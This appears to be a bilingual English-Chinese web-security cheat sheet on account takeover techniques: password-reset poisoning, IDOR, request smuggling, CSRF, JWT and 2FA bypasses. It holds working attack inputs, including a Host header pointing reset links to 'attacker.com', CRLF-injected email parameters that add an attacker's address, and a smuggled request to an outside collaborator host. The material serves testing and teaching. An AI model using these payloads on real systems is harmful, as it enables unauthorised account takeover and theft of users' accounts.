# Account Takeover - 账户接管

## Summary - 总结

  - [Password Reset Feature - 密码重置](#password-reset-feature---密码重置)
    - [Password Reset Token Leak Via Referrer - 可能的密码重置Token泄露来源](#password-reset-token-leak-via-referrer---可能的密码重置token泄露来源)
    - [Account Takeover Through Password Reset Poisoning - 通过密码重置投毒接管账户](#account-takeover-through-password-reset-poisoning---通过密码重置投毒接管账户)
    - [Password Reset Via Email Parameter - 通过电子邮件参数重置密码](#password-reset-via-email-parameter---通过电子邮件参数重置密码)
    - [IDOR on API Parameters - API参数越权](#idor-on-api-parameters---api参数越权)
    - [Weak Password Reset Token - 脆弱的密码重置Token](#weak-password-reset-token---脆弱的密码重置token)
    - [Leaking Password Reset Token - 泄露密码重置Token](#leaking-password-reset-token---泄露密码重置token)
    - [Password Reset Via Username Collision - 通过用户名碰撞重置密码](#password-reset-via-username-collision---通过用户名碰撞重置密码)
    - [Account takeover due to unicode normalization issue - 通过unicode欺骗接管账户](#account-takeover-due-to-unicode-normalization-issue---通过unicode欺骗接管账户)
  - [Account Takeover Via Cross Site Scripting - 通过跨站脚本接管账户](#account-takeover-via-cross-site-scripting---通过跨站脚本接管账户)
  - [Account Takeover Via HTTP Request Smuggling - 通过HTTP请求走私接管账户](#account-takeover-via-http-request-smuggling---通过http请求走私接管账户)
  - [Account Takeover via CSRF - 通过CSRF接管账户](#account-takeover-via-csrf---通过csrf接管账户)
  - [Account Takeover via JWT - 通过JWT接管账户](#account-takeover-via-jwt---通过jwt接管账户)
  - [2FA Bypasses - 双重认证绕过](#2fa-bypasses---双重认证绕过)
    - [Response Manipulation - 操控Response](#response-manipulation---操控response)
    - [Status Code Manipulation - 操控Status Code](#status-code-manipulation---操控status-code)
    - [2FA Code Leakage in Response - Response中的2FA Code泄露](#2fa-code-leakage-in-response---response中的2fa-code泄露)
    - [JS File Analysis - 分析JS文件](#js-file-analysis---分析js文件)
    - [2FA Code Reusability - 2FA代码复用](#2fa-code-reusability---2fa代码复用)
    - [Lack of Brute-Force Protection - 缺乏爆破防护](#lack-of-brute-force-protection---缺乏爆破防护)
    - [Missing 2FA Code Integrity Validation - 缺失2FA Code完整性验证](#missing-2fa-code-integrity-validation---缺失2fa-code完整性验证)
    - [CSRF on 2FA Disabling - 缺乏CSRF保护](#csrf-on-2fa-disabling---缺乏csrf保护)
    - [Password Reset Disable 2FA -  密码重置时禁用2FA](#password-reset-disable-2fa----密码重置时禁用2fa)
    - [Backup Code Abuse - 备份代码滥用](#backup-code-abuse---备份代码滥用)
    - [Clickjacking on 2FA Disabling Page - 点击劫持](#clickjacking-on-2fa-disabling-page---点击劫持)
    - [Enabling 2FA doesn't expire Previously active Sessions - 使用2FA未过期时的存活Sessions](#enabling-2fa-doesnt-expire-previously-active-sessions---使用2fa未过期时的存活sessions)
    - [Bypass 2FA by Force Browsing - 通过强制浏览绕过](#bypass-2fa-by-force-browsing---通过强制浏览绕过)
    - [Bypass 2FA with null or 000000 - 通过null或000000绕过](#bypass-2fa-with-null-or-000000---通过null或000000绕过)
    - [Bypass 2FA with array - 通过数组绕过](#bypass-2fa-with-array---通过数组绕过)
  - [TODO](#todo)
  - [References](#references)

## Password Reset Feature - 密码重置

### Password Reset Token Leak Via Referrer - 可能的密码重置Token泄露来源

1. 请求将密码重置为您的电子邮件地址 
2. 单击密码重置链接 
3. 不要更改密码 
4. 单击任何第三方网站（例如：Facebook、twitter） 
5. Burp Suite 拦截请求 
6. 检查referer header是否正在泄漏密码重置令牌

### Account Takeover Through Password Reset Poisoning - 通过密码重置投毒接管账户

1. 拦截Burp Suite中的密码重置请求 
2. 在 Burp Suite 中添加或编辑以下标头：`Host: attacker.com, X-Forwarded-Host: attacker.com` 
3. 使用修改后的header转发请求

```
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: attacker.com
```

4. 寻找基于*host header*的密码重置URL，例如：`https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter - 通过电子邮件参数重置密码

```
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### IDOR on API Parameters - API参数越权

> 译者注：Insecure Direct Object reference (IDOR)不安全的直接对象引用，基于用户提供的输入对象直接访问，而未进行鉴权，这个漏洞在国内被称作越权漏洞。

1. 攻击者必须使用他们的帐户登录并转到**更改密码**功能
2. 启动 Burp Suite 并拦截请求 
3. 将其发送到repeater，编辑参数：用户 ID/电子邮件

```
POST /api/changepass
[...]
("form": {"email":"victim@email.com","password":"securepwd"})
```

### Weak Password Reset Token - 脆弱的密码重置Token

密码重置Token应该是随机生成的，并且每次都是唯一的。尝试确定Token是否过期或是否始终相同，在某些情况下生成算法很弱并且可以被猜到。

Token生成算法可能与以下因素有关：

- Timestamp - 时间戳
- UserID - 用户ID
- Email of User - 用户电子邮箱
- Firstname and Lastname - 名字和姓氏
- Date of Birth - 出生日期
- Cryptography - 密码学
- Number only - 仅数字
- Small token sequence (<6 characters between [A-Z,a-z,0-9]) - 小于6的长度
- Token reuse - Token复用
- Token expiration date - Token过期时间

### Leaking Password Reset Token - 泄露密码重置Token

1. 使用特定电子邮件的 API/UI 触发密码重置请求，例如：test@mail.com 
2. 检查服务器响应并检查 `resetToken` 
3. 在 URL 中使用令牌，例如 `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision - 通过用户名碰撞重置密码

1. 使用与受害者用户名相同的用户名在系统上注册，但在用户名之前和/或之后插入空格。例如：`"admin "`
2. 使用该恶意用户名请求重设密码
3. 使用发送到您电子邮件的令牌并重置受害者密码
4. 使用新密码连接到受害者帐户

CTFd 平台容易受到这种攻击。请参阅： [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account takeover due to unicode normalization issue - 通过unicode欺骗接管账户

- 受害者账户: `demo@gmail.com`
- 攻击者账户: `demⓞ@gmail.com`

## Account Takeover Via Cross Site Scripting - 通过跨站脚本接管账户

1. 如果 cookie 的范围限于父域 `*.domain.com`，则在应用程序或子域中查找 XSS
2. 获取当前 **sessions cookie**
3. 使用 cookie 假扮用户进行身份验证

## Account Takeover Via HTTP Request Smuggling - 通过HTTP请求走私接管账户

请参阅 **HTTP 请求走私**漏洞页面。 

1. 使用 **smuggler** 检测 HTTP Request Smuggling 类型（CL, TE, CL.TE）

```
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h
```

2. 伪造请求，使用以下数据覆盖 `POST / HTTP/1.1`：

```
GET http://something.burpcollaborator.net  HTTP/1.1
X: 
```

3. 最终请求可能如下所示：

```
GET /  HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```

Hackerone中该漏洞的相关报告：

- https://hackerone.com/reports/737140
- https://hackerone.com/reports/771666

## Account Takeover via CSRF - 通过CSRF接管账户

1. 为 CSRF 创建有效Payload，例如：“自动提交密码更改的 HTML 表单” 
2. 发送Payload

## Account Takeover via JWT - 通过JWT接管账户

JSON Web Token 可用于对用户进行身份验证。 

- 使用另一个用户 ID / 电子邮件编辑 JWT 
- 检查脆弱的 JWT 签名

## 2FA Bypasses - 双重认证绕过

> 译者注：2FA，Two Factor Authentication，双重身份认证

### Response Manipulation - 操控Response

将Response中的 `"success":false` 变换为 `"success":true`。

### Status Code Manipulation - 操控Status Code

如果 Status Code 为 **4xx** 尝试将其更改为 **200 OK** ，查看是否绕过限制。

### 2FA Code Leakage in Response - Response中的2FA Code泄露

查看2FA Code触发请求的响应，查看Code是否泄露。

### JS File Analysis - 分析JS文件

比较罕见，但一些 JS 文件可能包含有关 2FA Code的信息，值得一试。

### 2FA Code Reusability - 2FA代码复用

相同的Code可以重复使用。

### Lack of Brute-Force Protection - 缺乏爆破防护

可以破解任意长度的2FA Code。

### Missing 2FA Code Integrity Validation - 缺失2FA Code完整性验证

任何用户账户的Code都可以用于绕过2FA。

### CSRF on 2FA Disabling - 缺乏CSRF保护

禁用 2FA 时没有 CSRF 保护，也没有身份验证确认。

### Password Reset Disable 2FA -  密码重置时禁用2FA

在密码更改/电子邮件更改时禁用2FA。

### Backup Code Abuse - 备份代码滥用

通过滥用备份代码绕过 2FA 。使用上述技术绕过备份代码以删除/重置 2FA 限制。

### Clickjacking on 2FA Disabling Page - 点击劫持

渲染iframe 2FA 禁用页面，，或是利用社会工程，引导受害者禁用 2FA。

### Enabling 2FA doesn't expire Previously active Sessions - 使用2FA未过期时的存活Sessions

如果session已经被劫持，并且存在session超时的相关漏洞。

### Bypass 2FA by Force Browsing - 通过强制浏览绕过

如果在禁用 2FA 时，应用程序登录时重定向到路由 `/my-account` ，请尝试在启用 2FA 时，将 `/2fa/verify` 替换为 `/my-account` 以绕过验证。

### Bypass 2FA with null or 000000 - 通过null或000000绕过

输入 **000000** 或 **null** 以绕过 2FA 保护。

### Bypass 2FA with array - 通过数组绕过

```
{
    "otp":[
        "1234",
        "1111",
        "1337", // GOOD OTP
        "2222",
        "3333",
        "4444",
        "5555"
    ]
}
```

## TODO

- 破解密码 
- 会话劫持 
- OAuth错误配置

## References

- [10 Password Reset Flaws - Anugrah SR](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
- [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained](https://www.youtube.com/watch?v=gzM4wWA7RFo&feature=youtu.be)
- [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
- [Hacking Grindr Accounts with Copy and Paste - Troy HUNT & Wassime BOUIMADAGHENE - 03 OCTOBER 2020](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
- [CTFd Account Takeover](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
- [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)